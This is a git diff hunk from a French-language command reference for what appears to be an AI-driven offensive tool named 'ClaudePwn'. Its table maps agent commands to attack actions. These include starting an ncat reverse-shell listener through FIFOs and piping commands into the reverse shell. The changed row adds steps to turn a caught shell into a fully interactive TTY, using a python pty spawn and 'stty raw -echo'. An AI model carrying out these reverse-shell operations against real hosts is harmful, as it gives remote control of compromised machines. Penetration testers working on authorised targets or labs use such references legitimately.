@@ -126,7 +126,7 @@ Pour les ports non-standard (8080, 3000, etc.), ajoute le port : \`http://${doma
 | **shell ssh <user>** | Connexion SSH | ssh <user>@${ip} (avec password ou clé) |
 | **shell reverse <port>** | Écouter un reverse shell via FIFO | rm -f /tmp/shell_in /tmp/shell_out; mkfifo /tmp/shell_in; tail -f /tmp/shell_in | ncat -lvnp <port> -k > /tmp/shell_out 2>&1 & echo "Listener started on port <port> (PID: $!)" |
 | **shell cmd <commande>** | Envoyer une commande au reverse shell | echo "<commande>" > /tmp/shell_in; sleep 1; cat /tmp/shell_out |
-| **shell upgrade** | Upgrade shell → interactif | Dis à l'utilisateur d'ouvrir un terminal et lancer \`ncat -lvnp <port>\` pour un shell TTY complet. ClaudePwn ne peut pas gérer un shell interactif. |
+| **shell upgrade** | Upgrade shell → interactif | Dis à l'utilisateur d'ouvrir un terminal séparé et de suivre ces étapes : 1) \`ncat -lvnp <nouveau port>\` 2) ClaudePwn trigger un nouveau reverse shell vers ce port 3) Dans le terminal ncat, taper : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\`. Le shell sera alors pleinement interactif (tab, su, vi, etc.). |
 
 ### crack — Cracking
 | Commande | Actions | Outils |
